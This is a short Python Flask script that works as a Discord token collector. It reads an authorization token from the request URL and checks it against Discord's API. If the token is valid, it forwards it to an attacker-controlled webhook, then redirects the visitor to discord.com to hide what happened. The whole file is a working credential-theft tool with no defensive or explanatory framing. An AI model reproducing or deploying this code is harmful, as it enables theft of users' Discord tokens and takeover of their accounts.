from flask import Flask, redirect
from dhooks import Webhook
import requests
app = Flask(__name__)
hook = Webhook('YOUR WEBHOOK')

@app.route('/<string:test>')
def index(test):
    headers = {'Content-Type': 'application/json', 'authorization': test}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
      hook.send(test)
    else:
      print("Token didn't work.")
   
    
    return redirect("https://discord.com")


app.run(host='0.0.0.0', port=81)
